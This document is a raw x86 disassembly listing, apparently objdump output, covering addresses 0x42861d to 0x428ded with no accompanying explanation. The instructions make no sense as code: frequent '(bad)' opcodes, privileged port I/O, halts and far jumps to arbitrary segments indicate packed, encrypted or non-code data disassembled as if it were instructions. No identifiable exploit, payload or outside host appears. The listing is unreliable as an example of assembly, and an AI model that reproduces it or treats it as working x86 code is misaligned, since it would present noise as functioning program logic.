  42861d:	adc    dl,bh
  42861f:	out    dx,al
  428620:	(bad)  
  428621:	jno    0x428695
  428623:	fwait
  428624:	iret   
  428625:	sbb    eax,0xd292455b
  42862a:	pop    esi
  42862b:	fld    DWORD PTR [ecx-0x2e]
  42862e:	and    al,0x80
  428630:	or     eax,0xcf06ffc2
  428635:	rol    ecx,0x9c
  428638:	lea    ebp,[ebx]
  42863a:	(bad)  
  42863b:	jae    0x4285f5
  42863d:	popf   
  42863e:	push   edi
  42863f:	lea    ebx,[esi+0x5e]
  428642:	inc    edi
  428643:	mov    edi,0xb57940de
  428648:	mov    ebx,0x6ec4e08d
  42864d:	loope  0x4286b1
  42864f:	addr16 pop esi
  428651:	les    ebp,FWORD PTR [ebx]
  428653:	jns    0x428628
  428655:	scas   eax,DWORD PTR es:[edi]
  428656:	adc    esi,DWORD PTR ds:0xa9aa775e
  42865c:	out    0x74,eax
  42865e:	mov    WORD PTR [ebx+0x4033b47e],es
  428664:	inc    edx
  428665:	sub    eax,0xbd77e0e3
  42866a:	mov    ecx,0xea4c0188
  42866f:	add    DWORD PTR [eax-0x31a60a3],ebx
  428675:	les    esi,FWORD PTR [eax+0x18aa40b3]
  42867b:	push   eax
  42867c:	cmp    eax,esi
  42867e:	adc    ch,BYTE PTR [bx]
  428681:	nop
  428682:	hlt    
  428683:	(bad)  
  428684:	outs   dx,DWORD PTR ds:[esi]
  428685:	int3   
  428686:	pop    ebx
  428687:	or     esi,ecx
  428689:	xchg   esi,eax
  42868a:	mov    ebp,0x907d0b86
  42868f:	mov    esi,DWORD PTR [ecx-0x4a]
  428692:	sbb    edx,eax
  428694:	mov    ebp,0x23bc015b
  428699:	fwait
  42869a:	ret    0x3249
  42869d:	out    dx,al
  42869e:	adc    bh,BYTE PTR [edi-0x3]
  4286a1:	dec    esp
  4286a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286a3:	mov    es,WORD PTR [ebx]
  4286a5:	mov    cl,0x8
  4286a7:	aad    0xde
  4286a9:	mov    esi,0xfaf517b6
  4286ae:	pop    ebp
  4286af:	in     al,dx
  4286b0:	sub    bl,BYTE PTR es:[eax+0x6b]
  4286b4:	test   DWORD PTR [ecx+0x53],esi
  4286b7:	adc    ebp,DWORD PTR gs:[edi]
  4286ba:	cmp    DWORD PTR [ecx-0x4],esp
  4286bd:	mov    ebp,esp
  4286bf:	loop   0x428690
  4286c1:	adc    al,0x2a
  4286c3:	mov    dl,BYTE PTR [ebx+0x6417545e]
  4286c9:	mov    esi,0xff0c96be
  4286ce:	xor    al,0xf
  4286d0:	pop    esp
  4286d1:	cmp    al,0x9c
  4286d3:	ror    DWORD PTR [ebp+0x703c6da3],0xa9
  4286da:	inc    ecx
  4286db:	push   esp
  4286dc:	sbb    ebx,eax
  4286de:	pop    edi
  4286df:	jno    0x428667
  4286e1:	mov    bh,0xbd
  4286e3:	stc    
  4286e4:	dec    edx
  4286e5:	hlt    
  4286e6:	xchg   edi,eax
  4286e7:	pop    edx
  4286e8:	jo     0x428689
  4286ea:	mov    esi,0x9d162f80
  4286ef:	ins    DWORD PTR es:[edi],dx
  4286f0:	add    al,0x20
  4286f2:	sub    al,BYTE PTR [eax-0x31b5febc]
  4286f8:	mov    WORD PTR [esi+0x43da53],ds
  4286fe:	loop   0x4286ef
  428700:	adc    al,0xe2
  428702:	pop    ss
  428703:	add    esp,DWORD PTR [eax+0x2]
  428706:	mov    esi,0x8252437b
  42870b:	pop    edi
  42870c:	ret    
  42870d:	mov    DWORD PTR [edi-0x4c5e71f2],0x5e5581b1
  428717:	jne    0x428703
  428719:	mov    dh,BYTE PTR [esi+ebx*8]
  42871c:	sbb    BYTE PTR [eax-0x3a2ac6e0],cl
  428722:	in     eax,0x52
  428724:	or     BYTE PTR [edi+0x12ebe9ec],dh
  42872a:	iret   
  42872b:	xor    edx,eax
  42872d:	push   ds
  42872e:	addr16 jb 0x42874f
  428731:	std    
  428732:	mov    bl,0x9b
  428734:	cwde   
  428735:	and    ah,dh
  428737:	sti    
  428738:	out    0xc4,al
  42873a:	cs dec esp
  42873c:	in     eax,dx
  42873d:	int    0x22
  42873f:	mov    al,0x5e
  428741:	shl    ebx,0x9b
  428744:	ins    DWORD PTR es:[edi],dx
  428745:	in     eax,dx
  428746:	inc    ebx
  428747:	push   DWORD PTR [esi-0x57]
  42874a:	test   DWORD PTR [eax],esp
  42874c:	mov    ecx,0xf5c8dbdf
  428751:	aas    
  428752:	dec    ebx
  428753:	push   0xd756be78
  428758:	sbb    DWORD PTR [ecx-0x6f],edx
  42875b:	jbe    0x428764
  42875d:	inc    edi
  42875e:	xchg   edx,eax
  42875f:	add    esp,edi
  428761:	dec    edx
  428762:	push   eax
  428763:	jne    0x4286f3
  428765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428766:	adc    al,0xe3
  428768:	and    bl,BYTE PTR ds:0xed9d73f
  42876e:	add    DWORD PTR [esi-0x6d],edx
  428771:	xchg   edx,eax
  428772:	rcl    BYTE PTR [edi],0x39
  428775:	fsub   QWORD PTR [edx+0x1cc69aaf]
  42877b:	xchg   ecx,eax
  42877c:	sbb    ah,BYTE PTR [esi+0x3e]
  42877f:	mov    esi,0xa648b004
  428784:	arpl   dx,cx
  428786:	fstp   TBYTE PTR [eax+0x6a8e6f29]
  42878c:	mov    esi,0x127abcd7
  428791:	out    dx,al
  428792:	xor    eax,0xe7edfc31
  428797:	retf   
  428798:	aam    0xdd
  42879a:	sub    ebp,ecx
  42879c:	daa    
  42879d:	(bad)  
  42879e:	icebp  
  42879f:	fdivr  st,st(1)
  4287a1:	push   ebp
  4287a2:	sbb    eax,0x4a71eb7
  4287a7:	push   esi
  4287a8:	lea    ecx,[edi-0x7d]
  4287ab:	inc    ecx
  4287ac:	adc    eax,0x2a8165bd
  4287b1:	stos   DWORD PTR es:[edi],eax
  4287b2:	outs   dx,BYTE PTR ds:[esi]
  4287b3:	addr16 (bad) 
  4287b5:	push   edx
  4287b6:	and    eax,0xac191310
  4287bb:	xchg   esi,eax
  4287bc:	stos   DWORD PTR es:[edi],eax
  4287bd:	fcomp  st(4)
  4287bf:	pop    edx
  4287c0:	aad    0xeb
  4287c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287c3:	sbb    ah,dl
  4287c5:	cmc    
  4287c6:	mov    bl,0xfb
  4287c8:	adc    BYTE PTR [ecx-0x1c389e6a],ch
  4287ce:	js     0x428779
  4287d0:	mov    eax,ds:0xd0e75eda
  4287d5:	mov    es,ebp
  4287d7:	push   ecx
  4287d8:	and    DWORD PTR [ebx-0x4ec990a8],eax
  4287de:	das    
  4287df:	lahf   
  4287e0:	inc    ecx
  4287e1:	(bad)  
  4287e2:	nop
  4287e3:	pop    esi
  4287e4:	xor    DWORD PTR [eax+0x38cba5e5],eax
  4287ea:	inc    ecx
  4287eb:	ret    0x9fbf
  4287ee:	mov    ebx,0xa7d118a2
  4287f3:	test   BYTE PTR [ebp-0x1e],0x59
  4287f7:	mov    esi,0x5055ab1f
  4287fc:	fdiv   DWORD PTR [eax+esi*1-0x65]
  428800:	or     esp,DWORD PTR [ebx]
  428802:	push   ss
  428803:	push   ecx
  428804:	push   edx
  428805:	mov    ds:0x894a098f,al
  42880a:	sbb    bl,BYTE PTR [ecx]
  42880c:	shr    ebx,0x6c
  42880f:	pop    es
  428810:	lods   eax,DWORD PTR ds:[esi]
  428811:	jae    0x4287e0
  428813:	ins    DWORD PTR es:[edi],dx
  428814:	sbb    eax,DWORD PTR [eax+0x64b9c274]
  42881a:	lods   al,BYTE PTR ds:[esi]
  42881b:	retf   
  42881c:	jo     0x4287b1
  42881e:	adc    edi,DWORD PTR [ecx]
  428820:	lock sub bh,0xfe
  428824:	ins    BYTE PTR es:[edi],dx
  428825:	sbb    BYTE PTR [edi+0x30c3061f],al
  42882b:	add    esp,DWORD PTR [edi+0x3de50d64]
  428831:	or     DWORD PTR [edx-0x2cdb5cce],edi
  428837:	lock sub eax,0x16c207e1
  42883d:	outs   dx,BYTE PTR ds:[esi]
  42883e:	fsub   QWORD PTR [edi-0x5d]
  428841:	fwait
  428842:	mov    fs,WORD PTR [ecx]
  428844:	jae    0x428843
  428846:	push   ds
  428847:	xor    al,0xf3
  428849:	arpl   WORD PTR [eax+0x5cb03655],bp
  42884f:	or     eax,esp
  428851:	mov    ecx,0x29c4358b
  428856:	aad    0x3a
  428858:	popf   
  428859:	outs   dx,BYTE PTR es:[esi]
  42885b:	mov    esp,0xdce30a62
  428860:	call   0x2391a04f
  428865:	xor    DWORD PTR [ebx+0x46],edx
  428868:	mov    BYTE PTR [ebx-0x4c5e84c8],dl
  42886e:	mov    ds:0x5570f2a2,eax
  428873:	mov    ds:0xef02926,al
  428878:	push   cs
  428879:	loop   0x428896
  42887b:	int    0x1
  42887d:	xor    edx,DWORD PTR [edx]
  42887f:	jecxz  0x428875
  428881:	or     DWORD PTR [esi],ecx
  428883:	out    0xf3,al
  428885:	xor    eax,0xb6281ddf
  42888a:	nop
  42888b:	ss jl  0x4288c2
  42888e:	and    BYTE PTR [esi+0x441f332f],bl
  428894:	cwde   
  428895:	sahf   
  428896:	test   al,0x38
  428898:	dec    ebp
  428899:	jecxz  0x428839
  42889b:	fnstenvw ds:0xfc49aef9
  4288a2:	push   edx
  4288a3:	adc    edx,DWORD PTR [ecx-0x6]
  4288a6:	add    ebp,DWORD PTR [edx]
  4288a8:	inc    esi
  4288a9:	clc    
  4288aa:	fcmovb st,st(4)
  4288ac:	cmp    BYTE PTR [esi+0x16],0x48
  4288b0:	jne    0x4288d1
  4288b2:	int3   
  4288b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4288b4:	jne    0x428913
  4288b6:	int3   
  4288b7:	and    eax,0x88ebb80a
  4288bc:	jp     0x428848
  4288be:	scas   al,BYTE PTR es:[edi]
  4288bf:	sub    dl,BYTE PTR [ebx]
  4288c1:	push   ds
  4288c2:	ret    0x54c1
  4288c5:	adc    al,0x6d
  4288c7:	or     dl,BYTE PTR [esi-0x60db36e5]
  4288cd:	sub    esi,DWORD PTR [ecx-0x1]
  4288d0:	mov    ecx,0xfcdaf7af
  4288d5:	dec    esi
  4288d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4288d7:	adc    edi,0x4c
  4288da:	inc    esi
  4288db:	lock jg 0x428886
  4288de:	out    0x3f,eax
  4288e0:	push   ebp
  4288e1:	push   edi
  4288e2:	popa   
  4288e3:	cmc    
  4288e4:	add    DWORD PTR [edx+0x7b],ecx
  4288e7:	aad    0x3b
  4288e9:	and    ecx,DWORD PTR [eax+0xbb3dc8f]
  4288ef:	jg     0x4288e1
  4288f1:	lods   eax,DWORD PTR ds:[esi]
  4288f2:	gs ins BYTE PTR es:[edi],dx
  4288f4:	adc    bl,BYTE PTR [ebp+0x3f]
  4288f7:	mov    ebx,0x1c2740d5
  4288fc:	(bad)  
  4288fd:	push   ebx
  4288fe:	xchg   ecx,eax
  4288ff:	es push edx
  428901:	mov    bh,0xef
  428903:	inc    ebp
  428904:	call   DWORD PTR [ecx+edx*1+0x61]
  428908:	ja     0x428915
  42890a:	lahf   
  42890b:	pop    ebp
  42890c:	call   0x56f3d7a
  428911:	jae    0x4288a9
  428913:	mov    cl,0xd3
  428915:	or     esp,DWORD PTR [eax]
  428917:	xor    DWORD PTR [edx],edx
  428919:	push   ss
  42891a:	pop    es
  42891b:	fisubr WORD PTR [edi+0xf]
  42891e:	sub    eax,0x24c71888
  428923:	push   es
  428924:	inc    eax
  428925:	mov    BYTE PTR [ebx-0x56],al
  428928:	mov    esp,0xe0309ebc
  42892d:	div    ebx
  42892f:	pop    es
  428930:	mov    cl,0xb5
  428932:	jl     0x42894e
  428934:	stos   DWORD PTR es:[edi],eax
  428935:	adc    al,0xc7
  428937:	outs   dx,DWORD PTR ds:[esi]
  428938:	mov    edx,0xbb9b8f31
  42893d:	adc    DWORD PTR [edx+eax*8+0x2b],esp
  428941:	fsub   st,st(0)
  428943:	pop    DWORD PTR [edi-0x4e]
  428946:	adc    DWORD PTR [eax+ebp*4+0x24],ebp
  42894a:	gs jmp 0x391c:0x71ebcbb2
  428952:	mov    ecx,0xd3b3e38c
  428957:	call   0xde0b2472
  42895c:	mov    al,0xf
  42895e:	int    0x46
  428960:	sbb    eax,0xebeb5d9f
  428965:	call   0xdb97792b
  42896a:	fcmove st,st(2)
  42896c:	jnp    0x428971
  42896e:	or     edx,esp
  428970:	inc    ebp
  428971:	jmp    0x297b:0x8784d3b8
  428978:	pop    ebp
  428979:	dec    edi
  42897a:	jno    0x42893e
  42897c:	push   edi
  42897d:	daa    
  42897e:	pop    ebp
  42897f:	cld    
  428980:	loop   0x4289ca
  428982:	adc    eax,DWORD PTR [ecx-0x51ebf49e]
  428988:	js     0x428972
  42898a:	hlt    
  42898b:	shl    BYTE PTR [eax+0xd8dae21],0xf8
  428992:	push   edx
  428993:	dec    esi
  428994:	loop   0x428969
  428996:	test   DWORD PTR [ecx],eax
  428998:	cwde   
  428999:	leave  
  42899a:	sbb    eax,0x44088f80
  42899f:	out    dx,eax
  4289a0:	pop    ds
  4289a1:	sub    DWORD PTR [edi],0x97e147f9
  4289a7:	ds push ebx
  4289a9:	pop    es
  4289aa:	not    eax
  4289ac:	mov    ch,0x79
  4289ae:	pop    eax
  4289af:	ja     0x428957
  4289b1:	icebp  
  4289b2:	call   0x209efefa
  4289b7:	daa    
  4289b8:	into   
  4289b9:	into   
  4289ba:	int3   
  4289bb:	loopne 0x428986
  4289bd:	mov    bl,0xcb
  4289bf:	cmp    BYTE PTR [edi+0x6d],dl
  4289c2:	and    BYTE PTR [edi-0x1e],al
  4289c5:	das    
  4289c6:	ja     0x4289c3
  4289c8:	cwde   
  4289c9:	loope  0x42894b
  4289cb:	(bad)  
  4289cc:	test   eax,0xaa3bd79f
  4289d1:	cli    
  4289d2:	mov    cl,0x83
  4289d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289d5:	inc    esi
  4289d6:	sbb    ebx,ecx
  4289d8:	nop
  4289d9:	or     dl,bh
  4289db:	and    eax,0x5ee6e4fc
  4289e0:	adc    DWORD PTR [ecx+eiz*1],ebp
  4289e3:	mov    bh,0xe5
  4289e5:	jb     0x428a34
  4289e7:	js     0x428980
  4289e9:	mov    ebp,0xdaf8e157
  4289ee:	add    dl,BYTE PTR [edx-0x5f]
  4289f1:	add    bh,BYTE PTR [esi+0x68]
  4289f4:	iret   
  4289f5:	add    DWORD PTR [ebx+esi*4-0x63],edi
  4289f9:	inc    esp
  4289fa:	lods   eax,DWORD PTR ds:[esi]
  4289fb:	aaa    
  4289fc:	sbb    BYTE PTR [ecx-0x47],ah
  4289ff:	aad    0xc2
  428a01:	sbb    al,0xf
  428a03:	xchg   edx,esi
  428a05:	cmc    
  428a06:	(bad)  
  428a07:	mov    al,BYTE PTR ds:0xf136b664
  428a0d:	xor    al,dl
  428a0f:	jle    0x4289d6
  428a11:	mov    ebp,0xe18d1c9f
  428a16:	or     BYTE PTR [edi],bl
  428a18:	xchg   DWORD PTR [ecx],ebp
  428a1a:	sbb    DWORD PTR [edi],edx
  428a1c:	stos   BYTE PTR es:[edi],al
  428a1d:	push   cs
  428a1e:	mov    ds,WORD PTR [edi-0x58]
  428a21:	nop
  428a22:	mov    DWORD PTR [esi*2+0x25368853],eax
  428a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a2a:	mov    bl,BYTE PTR [edx]
  428a2c:	jnp    0x428a93
  428a2e:	sub    al,BYTE PTR [eax+0x3f1fa83b]
  428a34:	jb     0x4289e2
  428a36:	mov    ecx,0x184d225d
  428a3b:	in     al,0xba
  428a3d:	jno    0x4289bf
  428a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428a40:	call   0x936:0xb4be1d50
  428a47:	retf   
  428a48:	sub    al,0x7a
  428a4a:	test   eax,0x3e196ca0
  428a4f:	cmp    dl,BYTE PTR [eax]
  428a51:	aam    0x64
  428a53:	push   ss
  428a54:	push   edx
  428a55:	xchg   ebp,eax
  428a56:	hlt    
  428a57:	fnstcw WORD PTR [edx-0x27ec1789]
  428a5d:	jmp    0x787f9c97
  428a62:	pop    ds
  428a63:	jg     0x428a55
  428a65:	call   0xf478:0x51d0c577
  428a6c:	mov    ah,0x83
  428a6e:	les    eax,FWORD PTR [edx+0x17]
  428a71:	pop    edi
  428a72:	in     eax,0xd
  428a74:	out    dx,al
  428a75:	cld    
  428a76:	adc    eax,0x3a6f8532
  428a7b:	or     BYTE PTR [esi],bl
  428a7d:	or     ebx,eax
  428a7f:	call   0xd3e7:0xcfa50b1
  428a86:	mov    ch,0xd0
  428a88:	pop    eax
  428a89:	in     eax,dx
  428a8a:	jecxz  0x428a78
  428a8c:	inc    ebp
  428a8d:	addr16 inc edi
  428a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428a90:	adc    edi,DWORD PTR gs:[ebp+0x43dcf9c9]
  428a97:	lods   al,BYTE PTR ds:[esi]
  428a98:	sbb    eax,0x1a632b2c
  428a9d:	lock jl 0x428a7b
  428aa0:	div    DWORD PTR [esi+0x5c]
  428aa3:	in     eax,dx
  428aa4:	popf   
  428aa5:	fisttp QWORD PTR [edi]
  428aa7:	push   ebx
  428aa8:	test   al,0x5c
  428aaa:	push   edx
  428aab:	gs mov dh,0x30
  428aae:	inc    eax
  428aaf:	add    ah,BYTE PTR [edx+0x28c5482a]
  428ab5:	push   ecx
  428ab6:	jne    0x428a84
  428ab8:	inc    esi
  428ab9:	scas   eax,DWORD PTR es:[edi]
  428aba:	(bad)  
  428abb:	out    dx,eax
  428abc:	adc    BYTE PTR ds:0x327cdc59,bl
  428ac2:	or     DWORD PTR [si],esp
  428ac5:	xchg   ebx,eax
  428ac6:	nop
  428ac7:	jns    0x428b1a
  428ac9:	xchg   ecx,eax
  428aca:	and    al,0x68
  428acc:	cs pop es
  428ace:	mov    edi,0x8f01c849
  428ad3:	add    DWORD PTR [eax],ebp
  428ad5:	sbb    bh,BYTE PTR [edx+0x78fa45c4]
  428adb:	ds mov esi,ebx
  428ade:	stos   BYTE PTR es:[edi],al
  428adf:	pop    DWORD PTR [esi]
  428ae1:	out    dx,eax
  428ae2:	mov    esp,0xdbc1d1bf
  428ae7:	dec    ecx
  428ae8:	clc    
  428ae9:	or     edi,DWORD PTR [edx+esi*8-0x47eaac21]
  428af0:	imul   edi,DWORD PTR [esp+ecx*4],0x25
  428af4:	aaa    
  428af5:	test   BYTE PTR [edi+0x16],al
  428af8:	sub    edi,DWORD PTR [eax+0x5bc49f3e]
  428afe:	sub    eax,DWORD PTR ds:0xcf64201d
  428b04:	inc    ebp
  428b05:	popa   
  428b06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b07:	ins    DWORD PTR es:[edi],dx
  428b08:	cld    
  428b09:	(bad)  
  428b0a:	repz jne 0x428aaa
  428b0d:	and    edx,DWORD PTR [eax]
  428b0f:	or     eax,0x8439952a
  428b14:	sub    esi,DWORD PTR [ebx+0xf71ae01]
  428b1a:	jg     0x428b8d
  428b1c:	test   eax,0x5acf2482
  428b21:	sub    BYTE PTR [esi+0x55c377c3],dl
  428b27:	fcom   DWORD PTR [edi+0x4e]
  428b2a:	and    edx,DWORD PTR [eax-0x70653c75]
  428b30:	loope  0x428ba5
  428b32:	jg     0x428b2b
  428b34:	in     al,dx
  428b35:	jbe    0x428ac4
  428b37:	add    al,0xb3
  428b39:	cmp    al,0x9a
  428b3b:	inc    esp
  428b3c:	inc    ebp
  428b3d:	dec    edx
  428b3e:	push   eax
  428b3f:	xchg   ebx,eax
  428b40:	push   cs
  428b41:	add    eax,0x590ea096
  428b46:	add    cl,dl
  428b48:	mul    DWORD PTR [eax+eax*8-0x6ec38b7d]
  428b4f:	cmp    ch,BYTE PTR [edi+0x6f]
  428b52:	mov    esi,0x934bc6c9
  428b57:	jnp    0x428bca
  428b59:	idiv   al
  428b5b:	sub    DWORD PTR [edi+edi*2+0x59],ebx
  428b5f:	inc    ebp
  428b60:	jo     0x428ae7
  428b62:	mov    cl,0x71
  428b64:	ret    
  428b65:	sbb    BYTE PTR [edx-0x6f],cl
  428b68:	xor    cl,BYTE PTR [esi+0x2e]
  428b6b:	mov    dh,0x70
  428b6d:	and    al,0xee
  428b6f:	bound  esp,QWORD PTR ds:0x54f6616e
  428b75:	or     BYTE PTR [ebp+0x3a4da122],bl
  428b7b:	add    BYTE PTR ds:0x8dcf8a2b,0x4d
  428b82:	popa   
  428b83:	adc    BYTE PTR [eax],0xa6
  428b86:	dec    esp
  428b87:	jge    0x428b42
  428b89:	inc    esp
  428b8a:	pop    ebp
  428b8b:	out    dx,eax
  428b8c:	fsub   DWORD PTR [esi+0x49]
  428b8f:	test   DWORD PTR [esp+edi*4],0xa6e51e22
  428b96:	add    al,0x70
  428b98:	mov    eax,0xb701c359
  428b9d:	sub    DWORD PTR [ecx],0x444fdc4a
  428ba3:	jecxz  0x428c1d
  428ba5:	lds    ebx,FWORD PTR [eax+0x150d1f8b]
  428bab:	adc    DWORD PTR [eax],ebp
  428bad:	mov    ebx,0xf007ef18
  428bb2:	test   ebp,eax
  428bb4:	and    DWORD PTR [ecx+0x43],0x2e4b012a
  428bbb:	inc    eax
  428bbc:	sbb    DWORD PTR [esi-0x3e],edi
  428bbf:	(bad)  
  428bc0:	sbb    edx,ebp
  428bc2:	sub    dl,BYTE PTR [eax]
  428bc4:	int    0x4c
  428bc6:	not    DWORD PTR [ebp+0x77295e14]
  428bcc:	es sbb al,0x5b
  428bcf:	push   eax
  428bd0:	into   
  428bd1:	fdivr  QWORD PTR [esi+0x42ff8c11]
  428bd7:	push   cs
  428bd8:	imul   BYTE PTR [esp+eax*1-0x61]
  428bdc:	cli    
  428bdd:	xchg   ebx,eax
  428bde:	or     bl,BYTE PTR [esi+0x3888d829]
  428be4:	dec    ebp
  428be5:	sub    eax,0xf6dc03e1
  428bea:	dec    ebp
  428beb:	inc    edx
  428bec:	cmp    ch,bl
  428bee:	push   cs
  428bef:	mov    ecx,0x8448a16f
  428bf4:	mov    bl,0xd1
  428bf6:	jmp    0x376:0xf1414460
  428bfd:	mov    ebx,0x78c31a3
  428c02:	push   esp
  428c03:	jb     0x428c53
  428c05:	or     BYTE PTR [edi-0x13],dl
  428c08:	dec    ecx
  428c09:	loope  0x428bf2
  428c0b:	pop    ds
  428c0c:	aas    
  428c0d:	mov    ebx,DWORD PTR [edi-0x791cb136]
  428c13:	mov    DWORD PTR [ecx],esi
  428c15:	adc    al,0x7a
  428c17:	retf   
  428c18:	mov    eax,0x7dc41eb7
  428c1d:	cdq    
  428c1e:	sub    al,0xbe
  428c20:	jno    0x428c9b
  428c22:	or     eax,0x459defb7
  428c27:	xor    al,0x14
  428c29:	shl    BYTE PTR [ebp-0x62],cl
  428c2c:	mov    ds:0xc2691c64,eax
  428c31:	mov    ebp,0xec65b5a9
  428c36:	sub    dl,BYTE PTR [esi]
  428c38:	icebp  
  428c39:	and    al,0xf5
  428c3b:	loope  0x428c24
  428c3d:	sub    ch,ah
  428c3f:	outs   dx,DWORD PTR ds:[esi]
  428c40:	mov    eax,ds:0x9b3bb4aa
  428c45:	inc    esp
  428c46:	lds    edx,FWORD PTR [ebp+0x6c]
  428c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c4a:	mov    ecx,DWORD PTR [ebx]
  428c4c:	fwait
  428c4d:	sub    eax,0x1144cfec
  428c52:	loop   0x428cae
  428c54:	test   al,0xee
  428c56:	mov    dl,0xb7
  428c58:	push   eax
  428c59:	mov    ebp,0x5e769550
  428c5e:	fisubr WORD PTR [ebp+0x4d8bd8e2]
  428c64:	sbb    eax,0x404c25f9
  428c69:	sub    al,0xe5
  428c6b:	jmp    0x5050:0x2a3f00b9
  428c72:	push   ecx
  428c73:	adc    al,0xbe
  428c75:	cmc    
  428c76:	fld    TBYTE PTR [ebp+ecx*4+0x314fc368]
  428c7d:	xchg   esi,eax
  428c7e:	and    al,0x19
  428c80:	pop    ss
  428c81:	cmp    edx,DWORD PTR [ebx+0x48292460]
  428c87:	jmp    0xc2f8:0x8d004be2
  428c8e:	xchg   ebp,eax
  428c8f:	and    al,0x94
  428c91:	sub    dl,BYTE PTR [edx-0x76]
  428c94:	adc    esp,ebx
  428c96:	jne    0x428d0d
  428c98:	add    al,0x95
  428c9a:	or     eax,0x63ce5842
  428c9f:	dec    BYTE PTR [ebp-0x1c501a2c]
  428ca5:	cmp    ebx,edi
  428ca7:	xchg   esp,eax
  428ca8:	jmp    0xa108:0x9e216b76
  428caf:	fist   WORD PTR [edx-0x3a]
  428cb2:	imul   esp,DWORD PTR [edx+0x3b3b67c6],0x22
  428cb9:	push   edx
  428cba:	test   DWORD PTR [ecx],ecx
  428cbc:	cwde   
  428cbd:	fnsave gs:[eax+ecx*8+0x31]
  428cc2:	call   FWORD PTR [ebx]
  428cc4:	in     eax,0x21
  428cc6:	or     eax,0xfe6a9072
  428ccb:	stos   BYTE PTR es:[edi],al
  428ccc:	(bad)  
  428ccd:	in     al,dx
  428cce:	imul   ebp,DWORD PTR [edi-0x14],0x7db9bc7b
  428cd5:	cs fs loope 0x428cdd
  428cd9:	sbb    DWORD PTR [ebp-0x3f],esi
  428cdc:	and    eax,DWORD PTR [eax]
  428cde:	leave  
  428cdf:	nop
  428ce0:	push   esp
  428ce1:	imul   esi,DWORD PTR [eax+0x368b9c65],0xfffffffc
  428ce8:	int3   
  428ce9:	dec    edi
  428cea:	jno    0x428d61
  428cec:	dec    edx
  428ced:	inc    esi
  428cee:	test   al,0xfc
  428cf0:	or     ebx,DWORD PTR [eax]
  428cf2:	jae    0x428d0b
  428cf4:	dec    edi
  428cf5:	mov    dl,bh
  428cf7:	jge    0x428cd5
  428cf9:	arpl   WORD PTR [esi],sp
  428cfb:	adc    eax,DWORD PTR [esi]
  428cfd:	and    edx,DWORD PTR [eax]
  428cff:	push   ebp
  428d00:	repnz lods eax,DWORD PTR ds:[esi]
  428d02:	mov    ecx,eax
  428d04:	pop    eax
  428d05:	jne    0x428cfc
  428d07:	sub    al,0xfe
  428d09:	push   0xbfe36b36
  428d0e:	adc    ebp,DWORD PTR [edi-0x61]
  428d11:	test   al,0xb7
  428d13:	push   ecx
  428d14:	sub    DWORD PTR [ebp-0x6f],edx
  428d17:	enter  0xf065,0x7f
  428d1b:	inc    ebx
  428d1c:	cmp    eax,0x87b75bfc
  428d21:	fcomp  DWORD PTR [esi+edx*1-0x47]
  428d25:	je     0x428d39
  428d27:	iret   
  428d28:	pop    esi
  428d29:	scas   al,BYTE PTR es:[edi]
  428d2a:	loop   0x428d74
  428d2c:	imul   ecx,DWORD PTR [ebx],0x37315473
  428d32:	inc    esi
  428d33:	adc    ebp,DWORD PTR [eax]
  428d35:	pop    es
  428d36:	test   al,0x62
  428d38:	push   edx
  428d39:	test   DWORD PTR [edx+0x64],edi
  428d3c:	mov    ecx,0x6f3e5da3
  428d41:	cwde   
  428d42:	mov    esp,ebx
  428d44:	imul   ecx,DWORD PTR [ebx-0x56],0x2d
  428d48:	mov    eax,0x8ba56a83
  428d4d:	jae    0x428d9c
  428d4f:	inc    edi
  428d50:	out    0x51,eax
  428d52:	sbb    al,0x4d
  428d54:	addr16 lock ja 0x428d15
  428d58:	sbb    dl,dl
  428d5a:	out    dx,eax
  428d5b:	mov    eax,0x3573fd16
  428d60:	ins    DWORD PTR es:[edi],dx
  428d61:	popa   
  428d62:	(bad)  
  428d63:	cld    
  428d64:	xchg   edi,eax
  428d65:	dec    edi
  428d66:	imul   eax,DWORD PTR [esi],0x70
  428d69:	fisub  WORD PTR [ebx-0x4df7eeeb]
  428d6f:	jg     0x428d53
  428d71:	adc    ecx,ebx
  428d73:	or     ch,BYTE PTR cs:[edx]
  428d76:	xchg   esi,eax
  428d77:	pusha  
  428d78:	leave  
  428d79:	test   BYTE PTR [ebx-0x596bfd8],dl
  428d7f:	sub    cl,dl
  428d81:	jg     0x428ded
  428d83:	cmp    DWORD PTR [edi-0x7e],0x89c5edec
  428d8a:	or     al,0xae
  428d8c:	cld    
  428d8d:	push   esi
  428d8e:	sbb    DWORD PTR [ebp-0x52],eax
  428d91:	into   
  428d92:	ja     0x428d56
  428d94:	popa   
  428d95:	adc    al,0x8f
  428d97:	into   
  428d98:	loop   0x428e04
  428d9a:	mov    dl,0xfe
  428d9c:	adc    ebp,ebx
  428d9e:	sub    eax,0x101764dc
  428da3:	cmp    al,0xde
  428da5:	(bad)  
  428da6:	dec    eax
  428da7:	pop    edi
  428da8:	add    eax,0x41ba8c3
  428dad:	lock xchg edi,eax
  428daf:	dec    ecx
  428db0:	or     ebp,ebp
  428db2:	xchg   ecx,eax
  428db3:	mov    ebp,0x8fa67578
  428db8:	jg     0x428de5
  428dba:	test   al,ah
  428dbc:	adc    dh,BYTE PTR [edi+0x6c]
  428dbf:	push   edx
  428dc0:	scas   eax,DWORD PTR es:[edi]
  428dc1:	push   ecx
  428dc2:	mov    edi,ebp
  428dc4:	xor    edi,DWORD PTR [ecx+edx*8-0x30eead3a]
  428dcb:	push   eax
  428dcc:	repnz test DWORD PTR [edx],0x6a5dde0e
  428dd3:	jecxz  0x428d6c
  428dd5:	mov    ds:0x5dc75c51,al
  428dda:	jle    0x428e53
  428ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ddd:	cmp    BYTE PTR ds:0x64f20ee1,0xcb
  428de4:	pop    edi
  428de5:	pop    edx
  428de6:	lds    esi,FWORD PTR [esi+0x25]
  428de9:	and    ch,dh
  428deb:	sub    al,0xd5
  428ded:	dec    esi
